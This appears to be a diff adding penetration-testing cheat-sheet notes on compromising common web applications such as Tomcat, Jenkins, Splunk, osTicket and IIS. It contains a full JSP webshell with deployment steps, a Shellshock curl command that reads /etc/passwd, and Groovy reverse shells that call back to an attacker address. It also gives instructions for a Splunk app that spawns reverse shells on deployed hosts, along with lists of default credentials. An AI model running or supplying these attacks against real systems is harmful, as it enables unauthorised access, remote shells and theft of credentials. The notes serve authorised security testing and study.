@@ -90,6 +90,60 @@ RewriteBase /
   - Go to Configuration > Templates and choose one
   - Click on a php page to bring up the source, and add something like `system($_GET['cmd']);`
 
+## Tomcat
+- Used for hosting Java-based frameworks (used to be for Java Server Pages (JSP) scripts)
+- Version in `/docs/`
+- `/conf/tomcat-users.xml` stores user creds and roles, try `tomcat/tomcat` or `admin/admin`
+- Commnand execution as administrator:
+  - Can upload a `.war` file (tomcat application) to compromise the app
+  - Navigate to `/manager/html` and upload the following file, zipped into an archive titled `{app_name}.war`
+
+```
+<%@ page import="java.util.*,java.io.*"%>
+<%
+//
+// JSP_KIT
+//
+// cmd.jsp = Command Execution (unix)
+//
+// by: Unknown
+// modified: 27/06/2003
+//
+%>
+<HTML><BODY>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+<%
+if (request.getParameter("cmd") != null) {
+        out.println("Command: " + request.getParameter("cmd") + "<BR>");
+        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+        OutputStream os = p.getOutputStream();
+        InputStream in = p.getInputStream();
+        DataInputStream dis = new DataInputStream(in);
+        String disr = dis.readLine();
+        while ( disr != null ) {
+                out.println(disr); 
+                disr = dis.readLine(); 
+                }
+        }
+%>
+</pre>
+</BODY></HTML>
+```
+
+  - Then, after deploying, go to `/{app_name}/cmd.jsp?cmd={command}`
+  - Can also just use msf's `multi/http/tomcat_mgr_upload` 
+
+**Tomcat Common Gateway Interface (CGI)**
+- CGI scripts, usually written in python, bash, or perl, are used to communicate/interact with external resources (like databases)
+- Default directory is `/cgi/` or `/cgi-bin`, and we can fuzz them for `.cmd, .bat, .py, .perl, .sh`
+  - If we find batch scripts, try passing additional arguments to them as so: `/welcome.bat?&{command}`
+  - Shellshock is an old CVE, but can be pretty prevalent on IoT devices
+    - Explotiation takes advantage of setting an environment variable allowing command execution
+    - `curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' {server}/cgi-bin/access.cgi`
 
 ## Email
 - [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum)
@@ -104,11 +158,100 @@ RewriteBase /
 - [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php\_reverse\_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php) - reverse shell (cross platform)
 
 ## Jenkins
-- Reverse shell:
+- Continues integration server for development
+- Will often not require any authntication
+- Can run arbitrary commands via Apache Groovy scripts in the Script Console at `/script`
+- Linux reverse shell:
 
 ```
-String host="localhost";
-int port=8044;
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{kali_ip}/{kali_port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+
+- Windows reverse shell:
+
+```
+String host="{kali_ip}";
+int port={kali_port};
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
+
+## Splunk
+- Will often not require authentication, or with defaults `admin:changeme` or  `admin:admin/Welcome/Welcome1`
+  - This occurs due to Splunk automatically changing to be a free version after 60 days  without payment
+- Many ways of command execution, like Django apps, scripted inputs (most common), and alerting scripts
+- Can get reverse shells from [this repo](https://github.com/0xjpuff/reverse_shell_splunk)
+- Command execution using reverse shell from above:
+  - Create custom splunk application (just a folder like "splunk_shell" with two subdirectories, "bin" and "default")
+  - "bin" folder should contain the scripts intended to run, including Powershell 1-liner (and `.bat` file to run it) and python revshell
+    - These can be found in the above repo, and will need to be edited if intended for unix
+  - Create `inputs.conf` in the directory root, which tells Splunk which scripts to run (run script every 10 seconds):
+
+```
+[script://./bin/rev.py]
+disabled = 0  
+interval = 10  
+sourcetype = shell 
+
+[script://.\bin\run.bat]
+disabled = 0
+sourcetype = shell
+interval = 10
+```
+  - Create a tarball with the repo with `tar -czvf {script_name}.tar.gz {script_directory_name}`
+  - Then, in `/en-US/manager/search/apps/local` go to "Install app from file" and start the nc listener
+  - Upload the tarball and upload, and scripts will be executed
+**Compromising deployed hosts from Splunk**
+  - If there are hosts deployed from Splunk with a Universal Forwarder installed, we can RCE them as well if we've fully compromised the host
+  - To push a reverse shell to those hosts, put application in `{Splunk_root_dir}/etc/deployment-apps` directory on the compromised Splunk machine
+    - This app will need to be a powershell revshell on Windows environments since the deployment servers aren't guaranteed to come with Python
+
+## PRTG Network Monitor
+- Somewhat common in internal networks for network management
+- Default creds of `prtgadmin:prtgadmin`, and versioning should be in the bottom left, with CVEs associated
+
+## osTicket
+- Can google search for "Helpdesk software - powered by osTicket", common-ish app used for ticket management (like Jira)
+- This can be an extremely useful site for obtaining a company email
+  - When submitting a ticket, we may get a notification email like "Send any more details to `{ticket_no}@{company}`"
+  - Information sent to the ticket email will appear on the ticketing page, resulting in our "own" corporate email
+  - This email can then be used to sign up for tools like Slack, Gitlab, Mattermost, Rocket.chat, Bitbucket, etc.
+- Useful for obtaining IT/helpdesk domain users from submitting non-relevant tickets
+- Some CVEs associated as well
+
+## Gitlab
+- Useful for finding sensitive info, like passwords or SSH keys
+- `/help` for fingerprinting version after being logged in
+  - Only vuln I'd try without auth would be the critical [account takeover](https://gitlab.com/gitlab-org/gitlab/-/issues/436084)
+- Attempt to self-singup at `/users/sign_up`
+
+## ColdFusion
+- Programming language and dev platorm based on Java, meant to be hooked up to databases
+- ColdFusion Markup Language (CFML) is the programming languaged used for web apps, but can integrate deeper (like performing SQL queries or email management)
+- Find version from application error messages; many CVEs exist
+- `{cf_root_dir}/lib/password.properties` has encrypted passwords in key-value pairs
+
+## IIS Servers
+- Some versions of Microsoft servers create short file names for files ({8_char_filename}.{3_char_extension})
+- The server will respond with 200s for matching parts of a filename
+  - This means that if a directory like `/secret~1/` exists, the server will return 200s for `/~s`, `/~se`, `/~sec`, and so on, until we reach `/~secret`
+    - At this point we can turn `/~secret` into `/secret~1/` and fuzz the contents within the directory
+  - Same thing works for filenames, e.g. `/secret~1/somefi~1.txt`
+    - `somefile1.txt` would become `somefi~1.txt`, and `somefileextrastuffhere.txt` would become `somefi~2.txt`
+- This can be done automatically with [IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)
+  `java -jar iis_shortname_scanner.jar 0 5 http://{server}/`
+
+## Miscellaneous
+- Many of the below have plenty of CVEs, just look em up
+- Nagios - default creds of `nagiosadmin:PASSW0RD`
+- Websphere - default creds of `system:manager`
+- Axis2 - built on top of Tomcat, can deploy webshell in `AAR` file with [msf module](https://packetstorm.news/files/id/96224)
+- Elasticsearch - somewhat prevalent CVE: [https://www.exploit-db.com/exploits/36337](https://www.exploit-db.com/exploits/36337)
+- Zabbix - has built-in functionality to execute commands
+- WebLogic - 190 reported CVEs
+- MediaWiki - Many CVEs, especially in added extensions and libraries - also worth searching for sensitive info (see External notes)
+- DotNetNuke - has some severe CVEs associated
+- vCenter - manages multiple ESXis; Nessus will not pick up on some CVEs like [Apache Strust 2 RCE](https://blog.gdssecurity.com/labs/2017/4/13/vmware-vcenter-unauthenticated-rce-using-cve-2017-5638-apach.html) and [CVE-2021-22005](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22005)
+
